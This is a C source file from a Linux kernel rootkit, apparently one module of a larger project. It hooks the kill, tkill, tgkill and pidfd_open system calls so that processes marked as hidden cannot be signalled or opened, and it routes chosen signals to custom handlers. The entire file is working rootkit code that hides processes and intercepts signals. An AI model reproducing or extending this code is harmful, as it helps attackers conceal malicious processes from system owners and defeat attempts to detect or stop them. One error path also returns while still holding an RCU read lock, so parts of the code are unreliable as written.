#include "macro_utils.h"
#include "syscall_hooks.h"
#include "utils.h"
#include <asm-generic/errno-base.h>
#include <linux/kernel.h>
#include <linux/pidfd.h>
#include <linux/printk.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/types.h>

static task_t *(*_find_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_task_by_vpid()`

static long
do_tgkill(sysfun_t orig_func, struct pt_regs *p_regs, pid_t i32_tgid, pid_t i32_pid, int i32_sig)
{
    struct task_struct *p_task = NULL; // Pointer to the task_struct of the process
    pid_t i32_tgid2            = 0;    // TGID of the thread

    IF_U (_find_task_by_vpid == NULL) {
        _find_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");

        pr_info("[ROOTKIT] * `find_task_by_vpid()` address: %p\n", _find_task_by_vpid);

        IF_U (_find_task_by_vpid == NULL) {
            pr_err("[ROOTKIT] * Failed to get `find_task_by_vpid()` address\n");
        }
    }

    rcu_read_lock();
    p_task = _find_task_by_vpid(i32_pid);
    if (p_task == NULL) {
        return -ESRCH;
    }
    i32_tgid2 = task_tgid_vnr(p_task);
    rcu_read_unlock();

    if (i32_tgid <= 0 || i32_tgid == i32_tgid2) {
        IF_U (check_pid_hidden_auth(i32_pid)) {
            pr_info("[ROOTKIT] * Intercepted signal %d for hidden PID %d\n", i32_sig, i32_tgid);
            return -ESRCH;
        }

        return orig_func(p_regs);
    }

    return -ESRCH;
}

// sys_kill syscall hook handler
SYSCALL_HOOK_HANDLER2(kill, orig_kill, p_regs, pid_t, i32_pid, int, i32_sig)
{
    size_t i;

    pr_info("[ROOTKIT] kill(%d, %d)\n", i32_pid, i32_sig);

    for (i = 0; P_SIG_HANDLERS[i].sig_handler != NULL; ++i) {
        IF_U ((P_SIG_HANDLERS[i].i32_pid == PID_ANY || P_SIG_HANDLERS[i].i32_pid == i32_pid) &&
              (P_SIG_HANDLERS[i].i32_sig == SIG_ANY || P_SIG_HANDLERS[i].i32_sig == i32_sig)) {
            pr_info("[ROOTKIT] * Intercepted signal %d for PID %d\n", i32_sig, i32_pid);
            return P_SIG_HANDLERS[i].sig_handler(i32_pid, i32_sig);
        }
    }

    // Check if the process is hidden; if so, return -ESRCH (No such process)
    IF_U (check_pid_hidden_auth(i32_pid)) {
        pr_info("[ROOTKIT] * Intercepted signal %d for hidden PID %d\n", i32_sig, i32_pid);
        return -ESRCH;
    }

    // Signal was not intercepted, forward it to the original syscall
    return orig_kill(p_regs);
}

// sys_tkill syscall hook handler
SYSCALL_HOOK_HANDLER2(tkill, orig_tkill, p_regs, pid_t, i32_pid, int, i32_sig)
{
    long i64_ret = 0;

    pr_info("[ROOTKIT] tkill(%d, %d)\n", i32_pid, i32_sig);

    IF_U (i32_pid <= 0) {
        return -EINVAL;
    }

    i64_ret = do_tgkill(orig_tkill, p_regs, 0, i32_pid, i32_sig);
    pr_info("[ROOTKIT] * tkill return value: %ld\n", i64_ret);

    return i64_ret;
}

// sys_tgkill syscall hook handler
SYSCALL_HOOK_HANDLER3(tgkill, orig_tgkill, p_regs, pid_t, i32_tgid, pid_t, i32_pid, int, i32_sig)
{
    long i64_ret = 0;

    pr_info("[ROOTKIT] tgkill(%d, %d, %d)\n", i32_tgid, i32_pid, i32_sig);

    IF_U (i32_pid <= 0 || i32_tgid <= 0) {
        return -EINVAL;
    }

    i64_ret = do_tgkill(orig_tgkill, p_regs, i32_tgid, i32_pid, i32_sig);
    pr_info("[ROOTKIT] * tgkill return value: %ld\n", i64_ret);

    return i64_ret;
}

// sys_pidfd_open syscall hook handler
SYSCALL_HOOK_HANDLER2(pidfd_open, orig_pidfd_open, p_regs, pid_t, i32_pid, unsigned int, u32_flags)
{
    pr_info("[ROOTKIT] pidfd_open(%d, %#x)\n", i32_pid, u32_flags);

    IF_U (u32_flags & ~PIDFD_NONBLOCK || i32_pid <= 0) {
        return -EINVAL;
    }

    IF_U (check_pid_hidden_auth(i32_pid)) {
        return -ESRCH;
    }

    return orig_pidfd_open(p_regs);
}
